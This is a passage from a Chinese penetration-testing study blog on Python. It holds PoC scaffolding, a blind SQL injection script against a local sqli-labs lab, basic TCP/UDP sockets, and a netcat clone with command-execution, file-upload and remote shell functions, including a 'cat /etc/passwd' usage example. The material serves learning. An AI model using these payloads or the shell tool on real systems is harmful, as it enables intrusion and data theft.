        <category>web漏洞</category>
        <category>sql注入</category>
      </categories>
      <tags>
        <tag>联合注入</tag>
      </tags>
  </entry>
  <entry>
    <title>python与渗透</title>
    <url>/2023/05/20/python%E4%B8%8E%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>wingide personal 9_9.1 </p>
<h1 id="1-poc编写"><a href="#1-poc编写" class="headerlink" title="1.poc编写"></a>1.poc编写</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#输入点确定</span></span><br><span class="line"><span class="comment">#构造恶意输入</span></span><br><span class="line"><span class="comment">#目标检验</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#1.url处理</span></span><br><span class="line"><span class="comment">#前缀协议的增删、结尾/的删除</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process_url</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url.startswith(<span class="string">&#x27;http://&#x27;</span>) <span class="keyword">and</span> <span class="keyword">not</span> url.startswith(<span class="string">&#x27;https://&#x27;</span>):</span><br><span class="line">        url=<span class="string">&#x27;http://&#x27;</span>+url</span><br><span class="line"></span><br><span class="line">    <span class="comment">#只获取域名部分</span></span><br><span class="line">    url_paths=url.split(<span class="string">&#x27;/&#x27;</span>) <span class="comment">#如[http, ,www.ip,path,to,file] </span></span><br><span class="line">    <span class="comment">#有空的部分是因为 http://，有两个/，第二个/分割后没有值</span></span><br><span class="line">    url_without_path=<span class="string">&#x27;/&#x27;</span>.join(url_paths[:<span class="number">3</span>])<span class="comment">#列表第0,1,2元素</span></span><br><span class="line">    <span class="comment">#删除&quot;/&quot;</span></span><br><span class="line">    <span class="keyword">if</span> url_without_path.endswith(<span class="string">&#x27;/&#x27;</span>):</span><br><span class="line">        url_without_path=url_without_path[:-<span class="number">1</span>] <span class="comment">#开头到倒数第二个字符</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> url_without_path</span><br><span class="line"><span class="comment">#2.状态码识别 导入requests库</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getcode</span>(<span class="params">url</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response=requests.get(url)</span><br><span class="line">        <span class="keyword">return</span> response.status_code</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"><span class="comment">#3.文件读取 批量漏洞验证，即读取多个url</span></span><br><span class="line"><span class="comment">#line.strip()去除该行的首尾空白字符（包括换行符）。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getfile</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(filename,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">            urls=[line.strip() <span class="keyword">for</span> line <span class="keyword">in</span> file.readlines()] <span class="comment">#列表推到式 </span></span><br><span class="line">        <span class="keyword">return</span> urls</span><br><span class="line">    <span class="keyword">except</span> IOError:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;无法读取文件&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span>[]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment">#读取url列表</span></span><br><span class="line">    filename=<span class="built_in">input</span>(<span class="string">&quot;url文件名&quot;</span>)</span><br><span class="line">    urls=getfile(filename)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(urls)==<span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;没呀&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        process_url=process_url(url)<span class="comment">#处理成域名</span></span><br><span class="line">        status_code=getcode(process_url)</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;\n<span class="subst">&#123;process_url&#125;</span>\n状态码:<span class="subst">&#123;status_code&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><strong>response方法</strong></p>
<table>
<thead>
<tr>
<th>response.status_code</th>
<th>相应的状态码</th>
</tr>
</thead>
<tbody><tr>
<td>response.json()</td>
<td>响应体的特殊字段</td>
</tr>
<tr>
<td>response.text</td>
<td>响应体里的文本内容</td>
</tr>
<tr>
<td>response.headers</td>
<td>响应头字段</td>
</tr>
<tr>
<td>response.elapsed</td>
<td>响应包的响应时间</td>
</tr>
<tr>
<td>response.content</td>
<td>响应体的二进制数据</td>
</tr>
</tbody></table>
<h2 id="poc验证"><a href="#poc验证" class="headerlink" title="poc验证"></a>poc验证</h2><h3 id="post"><a href="#post" class="headerlink" title="post"></a>post</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#4.poc post验证 如果是sql注入</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">poc_post</span>(<span class="params">target</span>):</span><br><span class="line">    url=target+<span class="string">&quot;/&quot;</span></span><br><span class="line">    <span class="comment">#参数</span></span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;123&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>:<span class="string">&#x27;123&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#头部</span></span><br><span class="line">    headers=&#123;</span><br><span class="line">          <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response=requests.post(url,data=data,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> response.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;漏洞存在&quot;</span>)</span><br><span class="line">            <span class="comment">#可进一步处理漏洞</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;无漏洞&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;请求异常:&quot;</span>,e)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="get"><a href="#get" class="headerlink" title="get"></a>get</h3><p>data改为params即可</p>
<h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>以sqli-labs less 8为例</p>
<p>二分查找当然更好</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://localhost:81/sqli/Less-8/?id=&quot;</span></span><br><span class="line">i=<span class="number">1</span></span><br><span class="line">name=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">#substr从1开始</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">10</span>:</span><br><span class="line">      <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>,<span class="number">128</span>):    </span><br><span class="line">       <span class="comment"># id=f&quot;1&#x27; and ascii(substr(database(),&#123;i&#125;,1))=&#123;j&#125;--+&quot;</span></span><br><span class="line">        <span class="built_in">id</span>=<span class="string">f&quot;1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 2,1),<span class="subst">&#123;i&#125;</span>,1))=<span class="subst">&#123;j&#125;</span>--+&quot;</span></span><br><span class="line">        target=url+<span class="built_in">id</span></span><br><span class="line">        response=requests.get(target)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;You&quot;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">            name=name+<span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            i=i+<span class="number">1</span></span><br></pre></td></tr></table></figure>



<h1 id="2-socket模块"><a href="#2-socket模块" class="headerlink" title="2.socket模块"></a>2.socket模块</h1><p>客户端、服务端，TCP代理的编写；然后完善成自己的netcat，最后完成一个命令行shell工具编写。为了后续编写主机发现工具，实现跨平台嗅探、创建木马框架。</p>
<h2 id="1-基本的tcp-c-x2F-s"><a href="#1-基本的tcp-c-x2F-s" class="headerlink" title="1.基本的tcp c&#x2F;s"></a>1.基本的tcp c&#x2F;s</h2><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">target_host=<span class="string">&quot;www.baidu.com&quot;</span></span><br><span class="line">target_port=<span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#socket对象的建立</span></span><br><span class="line">client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment">#客户端连接</span></span><br><span class="line">client.connect((target_host,target_port))</span><br><span class="line"></span><br><span class="line"><span class="comment">#发送数据</span></span><br><span class="line">client.send(<span class="string">b&quot;GET / HTTP/1.1\r\nHost:baidu.com\r\n\r\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收数据</span></span><br><span class="line">response=client.recv(<span class="number">4096</span>)<span class="comment">#只从服务端接收4096字节的数据</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p><strong>AF_INET</strong> 表明用ipv4地址或主机名</p>
<p><strong>SOCK_STREAM</strong>指明TCP客户端</p>
<p>客户端连接到服务器，发送数据</p>
<p>接收数据并将响应数据打印。</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/ak005469075/myblog/main/img/image-20230623224709461.png"></p>
<h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">bind_ip=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">bind_port=<span class="number">9999</span></span><br><span class="line"></span><br><span class="line">server=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#监听的ip地址和端口</span></span><br><span class="line">server.bind((bind_ip,bind_port))</span><br><span class="line"></span><br><span class="line"><span class="comment">#启动监听</span></span><br><span class="line">server.listen(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Listening on %s:%d&quot;</span> % (bind_ip,bind_port))</span><br><span class="line"></span><br><span class="line"><span class="comment">#客户处理线程</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_client</span>(<span class="params">client_socket</span>):</span><br><span class="line">    <span class="comment">#打印出客户端发送得到内容</span></span><br><span class="line">    request=client_socket.recv(<span class="number">4096</span>)<span class="comment">#执行后，消息发给客户端</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Recived: %s&quot;</span> % request.decode())</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#返还一个数据包</span></span><br><span class="line">    client_socket.send(<span class="string">b&quot;ACK!&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    client_socket.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">#等待连接。</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    client,addr=server.accept()<span class="comment">#client保存套接字，远程连接细节保存到addr</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Accepted connection from: %s:%d&quot;</span> % (addr[<span class="number">0</span>],addr[<span class="number">1</span>]))</span><br><span class="line">    <span class="comment">#挂起客户端线程，处理传入数据</span></span><br><span class="line">    client_handler=threading.Thread(target=handle_client,args=(client,)) <span class="comment">#新的线程对象，将客户端套接字对象作为句柄传递</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#启动线程，处理客户端连接</span></span><br><span class="line">    client_handler.start()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<p>.accept()使得服务器可以接受客户端的连接请求，并返回一个用于与客户端进行通信的套接字对象和客户端的地址信息。</p>
</blockquote>
<p>配合客户端的配置(且本机关闭防火墙)</p>
<blockquote>
<p>host:127.0.0.1</p>
<p>port:9999</p>
<p>…</p>
<p>.send(b”hello\r\n”)</p>
<p>….</p>
</blockquote>
<p>先执行服务端，然后执行客户端</p>
<blockquote>
<p>[*] Listening on 0.0.0.0:9999<br>[*] Accepted connection from: 127.0.0.1:62496<br>[*] Recived: hello</p>
</blockquote>
<h2 id="2-基本的udp-c-x2F-s"><a href="#2-基本的udp-c-x2F-s" class="headerlink" title="2.基本的udp c&#x2F;s"></a>2.基本的udp c&#x2F;s</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">target_host=<span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">target_port=<span class="number">80</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#socket对象的建立</span></span><br><span class="line">client=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#发送数据</span></span><br><span class="line">client.send(<span class="string">b&quot;aaabbbccc&quot;</span>,(target_host,target_port))</span><br><span class="line"></span><br><span class="line"><span class="comment">#接收数据</span></span><br><span class="line">data,addr=client.recvfrom(<span class="number">4096</span>) <span class="comment">#回传的数据以及远程主机信息和端口号</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(data)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="3-netcat编写"><a href="#3-netcat编写" class="headerlink" title="3.netcat编写"></a>3.netcat编写</h2><p>即监听工具，比如一般使用的nc -lvnp 1234</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys   <span class="comment">#Python解释器和运行时环境交互</span></span><br><span class="line"><span class="keyword">import</span> socket <span class="comment">#客户端与服务端连接</span></span><br><span class="line"><span class="keyword">import</span> getopt <span class="comment">#命令行选项解析模块</span></span><br><span class="line"><span class="keyword">import</span> threading <span class="comment">#多线程编程,并发执行、异步操作和线程间的协调与通信等</span></span><br><span class="line"><span class="keyword">import</span> subprocess <span class="comment">#用于创建和管理子进程的模块,执行外部命令、调用其他可执行文件，并与其进行交互和处理。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#全局变量</span></span><br><span class="line">listen =<span class="literal">False</span></span><br><span class="line">command=<span class="literal">False</span></span><br><span class="line">upload =<span class="literal">False</span></span><br><span class="line">execute=<span class="string">&quot;&quot;</span></span><br><span class="line">target =<span class="string">&quot;&quot;</span></span><br><span class="line">port   =<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">usage</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;BHP Net Tool&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: bhpnet.py -t target_host -p port&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-l --listen          -listen on [host]:[port] for incoming connections&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-e  --execute=file_to_run -execute the given file upon receiving a connection&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-c --command     -initialize a command shell&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;-u --upload=destination  -upon receiving connection upload a file and write to [destination]&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ep:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bhpnet.py -t 192.168.0.1 -p 5555 -l -c&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bhpnet.py -t 192.168.0.1 -p 5555 -l -u=c:\\target.exe&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;bhpnet.py -t 192.168.0.1 -p 5555 -l -e=\&quot;cat /etc/passwd\&quot;&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;echo &#x27;abcd&#x27; | ./bhpnet.py -t 192.168.0.1 -p 5555&quot;</span>)</span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">global</span> listen</span><br><span class="line">    <span class="keyword">global</span> port</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    <span class="keyword">global</span> upload_destination</span><br><span class="line">    <span class="keyword">global</span> target</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(sys.argv[<span class="number">1</span>:]):</span><br><span class="line">        usage()</span><br><span class="line">        </span><br><span class="line">    <span class="comment">#2.读取命令行选项</span></span><br><span class="line">    <span class="keyword">try</span>: <span class="comment">#即常见的-h,-l,-e...由opts接收，而args是剩下的命令选项</span></span><br><span class="line">        opts,args=getopt.getopt(sys.argv[<span class="number">1</span>:],<span class="string">&quot;hle:t:p:cu:&quot;</span>,</span><br><span class="line">                                [<span class="string">&quot;help&quot;</span>,<span class="string">&quot;listen&quot;</span>,<span class="string">&quot;execute&quot;</span>,<span class="string">&quot;target&quot;</span>,<span class="string">&quot;port&quot;</span>,<span class="string">&quot;command&quot;</span>,<span class="string">&quot;upload&quot;</span>])</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> getopt.GetoptError <span class="keyword">as</span> err:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">str</span>(err))</span><br><span class="line">        usage()</span><br><span class="line">    <span class="keyword">for</span> o,a <span class="keyword">in</span> opts:</span><br><span class="line">        <span class="keyword">if</span> o <span class="keyword">in</span> (<span class="string">&quot;-h&quot;</span>,<span class="string">&quot;--help&quot;</span>):</span><br><span class="line">            usage()</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-l&quot;</span>,<span class="string">&quot;--listen&quot;</span>):</span><br><span class="line">            listen=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-e&quot;</span>,<span class="string">&quot;--excute&quot;</span>):</span><br><span class="line">            execute = a         </span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;--commandshell&quot;</span>):</span><br><span class="line">            command=<span class="literal">True</span></span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-u&quot;</span>,<span class="string">&quot;--upload&quot;</span>):</span><br><span class="line">            upload_destination=a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-t&quot;</span>,<span class="string">&quot;--target&quot;</span>):</span><br><span class="line">            target=a</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-p&quot;</span>,<span class="string">&quot;--port&quot;</span>):</span><br><span class="line">            port=<span class="built_in">int</span>(a)</span><br><span class="line">        <span class="keyword">elif</span> o <span class="keyword">in</span> (<span class="string">&quot;-u&quot;</span>,<span class="string">&quot;--upload&quot;</span>):</span><br><span class="line">            upload_destination=a            </span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">assert</span> <span class="literal">False</span>,<span class="string">&quot;input wrong!&quot;</span></span><br><span class="line">    <span class="comment">#3.监听或 仅从标准输入发送数据</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> listen <span class="keyword">and</span> <span class="built_in">len</span>(target) <span class="keyword">and</span> port &gt;<span class="number">0</span>:</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#从命令行读取内存数据</span></span><br><span class="line">        <span class="comment">#阻塞，不向标准输入发送数据时，发送ctrl -d</span></span><br><span class="line">        buffer =sys.stdin.read()</span><br><span class="line">        <span class="comment">#发送数据</span></span><br><span class="line">        client_sender(buffer)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#4.监听并上传文件、执行命令</span></span><br><span class="line">    <span class="comment">#放置一个反弹shell</span></span><br><span class="line">    <span class="comment">#取决于上面的命令行选项</span></span><br><span class="line">    <span class="keyword">if</span> listen:</span><br><span class="line">        server_loop()</span><br></pre></td></tr></table></figure>

<p>在main()函数中继续添加，用来接收、处理用户数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">client_sender</span>(<span class="params">buffer</span>):</span><br><span class="line">     client=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">try</span>:</span><br><span class="line">         <span class="comment">#连接到目标主机</span></span><br><span class="line">         client.connect((target,port))</span><br><span class="line">         <span class="keyword">if</span> <span class="built_in">len</span>(buffer):</span><br><span class="line">             client.send(buffer)</span><br><span class="line">             </span><br><span class="line">         <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">             <span class="comment">#等待数据回传</span></span><br><span class="line">             recv_len=<span class="number">1</span></span><br><span class="line">             response=<span class="string">&quot;&quot;</span></span><br><span class="line">             </span><br><span class="line">             <span class="keyword">while</span> recv_len:</span><br><span class="line">                 </span><br><span class="line">                 data=client.recv(<span class="number">4096</span>)</span><br><span class="line">                 recv_len=<span class="built_in">len</span>(data)</span><br><span class="line">                 response+=data</span><br><span class="line">                 </span><br><span class="line">                 <span class="keyword">if</span> recv_len&lt;<span class="number">4096</span>:</span><br><span class="line">                     <span class="keyword">break</span></span><br><span class="line">             <span class="built_in">print</span>(response)</span><br><span class="line">             </span><br><span class="line">             <span class="comment">#等待更多输入</span></span><br><span class="line">             buffer=raw_input(<span class="string">&quot;&quot;</span>)</span><br><span class="line">             buffer+=<span class="string">&quot;\n&quot;</span></span><br><span class="line">             </span><br><span class="line">             <span class="comment">#发送出去</span></span><br><span class="line">             client.send(buffer)</span><br><span class="line">     <span class="keyword">except</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;[*] Exception! Exiting.&quot;</span>)</span><br><span class="line">         </span><br><span class="line">         <span class="comment">#关闭连接</span></span><br><span class="line">         client.close()</span><br></pre></td></tr></table></figure>

<p>监听，然后运行命令，这些执行的命令，都被存储到output变量中了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">server_loop</span>():</span><br><span class="line">         <span class="keyword">global</span> target</span><br><span class="line">         </span><br><span class="line">         <span class="comment">#若无目标，监听所有接口</span></span><br><span class="line">         <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(target):</span><br><span class="line">             target=<span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">         server =socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">         server.bind((target,port))</span><br><span class="line">         </span><br><span class="line">         server.listen(<span class="number">5</span>)</span><br><span class="line">         </span><br><span class="line">         <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">             client_socket,addr=server.accept()</span><br><span class="line">             </span><br><span class="line">             <span class="comment">#分拆一个线程处理新的客户端</span></span><br><span class="line">             client_thread=threading.Thread(target=client_handler,</span><br><span class="line">             args=(client_socket,))</span><br><span class="line">             client_thread.start()</span><br><span class="line">     </span><br><span class="line">     <span class="keyword">def</span> <span class="title function_">run_command</span>(<span class="params">command</span>):</span><br><span class="line">         </span><br><span class="line">         <span class="comment">#换行</span></span><br><span class="line">         command=command.rstrip()</span><br><span class="line">         <span class="comment">#运行命令并将输出返回</span></span><br><span class="line">         </span><br><span class="line">         <span class="keyword">try</span>:</span><br><span class="line">             output=subprocess.check_output(command,stderr=subprocess.</span><br><span class="line">                                            STDOUT,shell=<span class="literal">True</span>)</span><br><span class="line">         <span class="keyword">except</span>:</span><br><span class="line">             output=(<span class="string">&quot;Failed to execute command.\r\n&quot;</span>)</span><br><span class="line">         <span class="comment">#发送输出</span></span><br><span class="line">         <span class="keyword">return</span> output</span><br></pre></td></tr></table></figure>

<p>文件上传、命令执行和shell相关功能</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">client_handler</span>(<span class="params">client_socket</span>):</span><br><span class="line">    <span class="keyword">global</span> upload</span><br><span class="line">    <span class="keyword">global</span> execute</span><br><span class="line">    <span class="keyword">global</span> command</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#检测上传文件</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(upload_des):</span><br><span class="line">        <span class="comment">#读取所有字符并写下目标</span></span><br><span class="line">        file_buffer=<span class="string">&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="comment">#持续读取直到没有符合的数据</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                file_buffer+=data</span><br><span class="line">        <span class="comment">#接收数据并写出来</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            file_descriptor=<span class="built_in">open</span>(upload_des,<span class="string">&quot;wb&quot;</span>)</span><br><span class="line">            file_descriptor.write(file_buffer)</span><br><span class="line">            file_descriptor.close()</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#检查文件是否写出来了</span></span><br><span class="line">            </span><br><span class="line">            client_socket.send(<span class="string">b&quot;Successfully saved file to %s\r\b&quot;</span> % upload_des)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            client_socket.send(<span class="string">b&quot;Failed to save file to %s\r\b&quot;</span> % upload_des)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#检查命令执行</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(execute):</span><br><span class="line">        <span class="comment">#运行命令</span></span><br><span class="line">        output=run_command(execute)</span><br><span class="line">        client_socket.send(output)</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    <span class="comment">#命令行shell</span></span><br><span class="line">    <span class="keyword">if</span> command:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="comment">#弹出窗口</span></span><br><span class="line">            client_socket.send(<span class="string">b&quot;&lt;BHP:#&gt;&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#现在接收文件，直到发现换行符</span></span><br><span class="line">       		cmd_buffer=<span class="string">&quot;&quot;</span></span><br><span class="line">       		<span class="keyword">while</span> <span class="string">&quot;\n&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> cmd_buffer:</span><br><span class="line">                </span><br><span class="line">            	cmd_buffer+=client_socket.recv(<span class="number">1024</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment">#返还命令输出</span></span><br><span class="line">            response=run_command(cmd_buffer)</span><br><span class="line">            <span class="comment">#返回响应数据</span></span><br><span class="line">            client_socket.send(response)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>windows下：</p>
<p>服务器端cd到文件所在目录:python netcat.py -l -p 5555 -c</p>
<p>客户端cd到文件所在目录:python netcat.py -t localhost -p 5555</p>
<p>然后输入信息，观察服务器端情况</p>
<p>客户端输入dir回车时，服务端出现：</p>
</blockquote>
<blockquote>
<p>Exception in thread Thread-12:<br>Traceback (most recent call last):</p>
<p>…  target(*self._args, **self._kwargs)<br>  File “netcat.py”, line 203, in client_handler<br>    cmd_buffer+&#x3D;client_socket.recv(1024)<br>ConnectionAbortedError: [WinError 10053] 你的主机中的软件中止了一个已建立的连接。</p>
</blockquote>
<blockquote>
<p>客户端提示是触发了client_sender里的except，将原except改一下：</p>
<p>发现原因：</p>
<p>dir<br>[*] Exception: a bytes-like object is required, not ‘str’</p>
</blockquote>
<blockquote>
<p> 将client_sender()处的clent.send改为：</p>
<p>  client.send(buffer.encode()) &#x2F;&#x2F;创建一个字节类型的对象并将其发送给服务器。</p>
</blockquote>
<blockquote>
<p>但是：</p>
<p>[*] Exception: can only concatenate str (not “bytes”) to str</p>
</blockquote>
<blockquote>
<pre><code>      print(response.decode())
    #等待更多输入
     #buffer=raw_input(&quot;&quot;)
     buffer=input(&quot;&quot;)
     buffer+=&quot;\n&quot;
                
     #发送出去
     client.send(buffer.encode())
     
     
     ....
                     
      while b&quot;\n&quot; not in cmd_buffer:
</code></pre>
<p>  <strong>.send()和.recv()函数要的是字节型字符串，注意不要把字节型字符串与普通字符拼接。</strong></p>
</blockquote>
<blockquote>
<p>之后出现</p>
<p> Exception: ‘utf-8’ codec can’t decode byte 0xc7 in position 1: invalid continuation byte</p>
<p>考虑在windows环境下执行，需要import chardet，编码为gbk</p>
</blockquote>
